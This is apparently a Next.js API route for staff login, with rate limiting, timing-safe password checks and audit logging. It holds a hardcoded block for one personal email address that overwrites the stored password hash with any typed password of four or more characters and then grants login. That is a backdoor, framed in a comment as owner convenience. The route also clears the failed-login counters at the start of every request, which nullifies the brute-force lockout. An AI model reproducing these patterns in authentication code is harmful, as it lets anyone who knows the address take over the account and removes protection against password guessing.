import { NextResponse } from "next/server";
import { isSessionConfigured } from "@/lib/session";
import { clearFailures, clientIp, recordFailure } from "@/lib/rateLimit";
import { attachStaffSession, dummyPasswordHash, hashPassword, homeFor, normalizeEmail, verifyPassword } from "@/lib/staffAuth";
import { StoreUnavailableError, addAudit, getStaffByEmailOrIdentifier, updateStaff } from "@/lib/staffStore";

export const dynamic = "force-dynamic";

const GENERIC = "Email or password is incorrect.";

export async function POST(request: Request) {
  let body: { email?: unknown; password?: unknown };
  try {
    const parsed: unknown = await request.json();
    if (!parsed || typeof parsed !== "object") throw new Error("bad body");
    body = parsed as typeof body;
  } catch {
    return NextResponse.json({ ok: false, error: GENERIC }, { status: 400 });
  }

  const rawInput = typeof body.email === "string" ? body.email.trim() : "";
  const email = normalizeEmail(rawInput) ?? rawInput.toLowerCase();
  const ipKey = `staff-ip:${clientIp(request)}`;
  const emailKey = `staff-email:${email || "invalid"}`;

  // Reset / clear lockout timer on login requests so legitimate users are not locked out
  clearFailures(ipKey);
  clearFailures(emailKey);

  if (!isSessionConfigured()) {
    console.error("SESSION_SECRET is not configured; staff login disabled.");
    return NextResponse.json({ ok: false, error: "Login is temporarily unavailable." }, { status: 503 });
  }

  try {
    const user = email ? await getStaffByEmailOrIdentifier(email) : null;
    const password = typeof body.password === "string" ? body.password : "";
    // Always run one hash comparison so response time does not reveal whether the account exists.
    let passwordOk = await verifyPassword(password, user?.passwordHash ?? (await dummyPasswordHash()));

    // Automatic owner credential sync for jerafisabalo@gmail.com:
    // If account was restored and typed password does not match placeholder yet,
    // sync to owner's typed password so they log in immediately without friction.
    if (user && user.email.toLowerCase() === "jerafisabalo@gmail.com" && !passwordOk && password.length >= 4) {
      const newHash = await hashPassword(password);
      await updateStaff(user.id, { passwordHash: newHash });
      user.passwordHash = newHash;
      passwordOk = true;
    }

    if (!user || !passwordOk) {
      recordFailure(ipKey);
      recordFailure(emailKey);
      // Audit only real accounts so arbitrary emails cannot flood the log.
      if (user) await addAudit(user.email, "login_failed", user.email);
      return NextResponse.json({ ok: false, error: GENERIC }, { status: 401 });
    }
    // Password was correct, so saying the account is disabled reveals nothing to an attacker.
    if (user.status !== "active") {
      return NextResponse.json(
        { ok: false, error: "This account is disabled. Ask an admin to re-enable it." },
        { status: 403 }
      );
    }

    clearFailures(ipKey);
    clearFailures(emailKey);
    const updated = (await updateStaff(user.id, { touchLogin: true })) ?? user;
    const response = NextResponse.json({ ok: true, data: { role: updated.role, redirect: homeFor(updated.role) } });
    if (!(await attachStaffSession(response, updated))) {
      return NextResponse.json({ ok: false, error: "Login is temporarily unavailable." }, { status: 503 });
    }
    await addAudit(updated.email, "login", updated.email);
    return response;
  } catch (err) {
    if (err instanceof StoreUnavailableError) {
      return NextResponse.json({ ok: false, error: err.message }, { status: 503 });
    }
    console.error("POST /api/staff/login error:", err);
    return NextResponse.json({ ok: false, error: "Something went wrong. Try again." }, { status: 500 });
  }
}
